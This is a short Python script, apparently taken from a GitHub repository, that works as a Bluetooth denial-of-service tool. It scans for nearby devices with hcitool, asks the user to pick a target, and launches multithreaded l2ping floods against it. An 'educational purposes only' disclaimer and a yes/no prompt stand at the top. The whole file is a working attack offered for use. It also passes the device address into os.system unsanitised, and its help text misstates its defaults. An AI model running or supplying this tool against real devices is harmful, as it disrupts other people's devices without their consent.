# Only for educational purposes
# SOURCE: https://github.com/infimiIT/bluetoothDOS
# Don't use in other than educational cases because it is illegal!

import subprocess
import threading
import os
import argparse
import logging

def scan_devices():
    try:
        result = subprocess.check_output(['hcitool', 'scan'], universal_newlines=True)
        lines = result.strip().split('\n')[1:]  # Ignore the first line, which is a header
        devices = [(line.split('\t')[1], line.split('\t')[2]) for line in lines]
        return devices
    except Exception as e:
        logging.error(f'Error scanning for devices: {e}')
        return []

def attack(target, size, count):
    command = f'l2ping -s {size} -c {count} {target}'
    os.system(command)

def main():
    print("This script is for educational purposes only. Unauthorized use of this script "
          "against devices you do not own or have explicit permission to test is illegal and "
          "punishable by law.")
    user_acceptance = input("Do you agree to use this script for educational purposes only and at your own risk? (yes/no): ")
    if user_acceptance.lower() != 'yes':
        print("User did not accept the terms. Exiting.")
        exit()

    parser = argparse.ArgumentParser(description='Bluetooth DoS Attack Script for Educational Purposes')
    parser.add_argument('--size', type=int, default=600, help='Packet size in bytes (default: 600)')
    parser.add_argument('--count', type=int, default=100, help='Number of packets to send (default: 1)')
    parser.add_argument('--threads', type=int, default=20, help='Number of threads (default: 5)')
    parser.add_argument('--log', default='info', choices=['debug', 'info', 'warning', 'error', 'critical'], help='Log level (default: info)')
    args = parser.parse_args()

    logging.basicConfig(level=args.log.upper(), format='%(levelname)s: %(message)s')

    devices = scan_devices()
    if not devices:
        logging.error('No devices found.')
        return

    print('Available devices:')
    for i, (address, name) in enumerate(devices, 1):
        print(f'{i}. {name} ({address})')

    try:
        choice = int(input('Enter the number of the device you want to attack: '))
        if not (1 <= choice <= len(devices)):
            raise ValueError
    except ValueError:
        logging.error('Invalid choice.')
        return

    target = devices[choice - 1][0]
    logging.info(f'Starting attack on {target}...')
    for _ in range(args.threads):
        threading.Thread(target=attack, args=(target, args.size, args.count)).start()

if __name__ == '__main__':
    main()
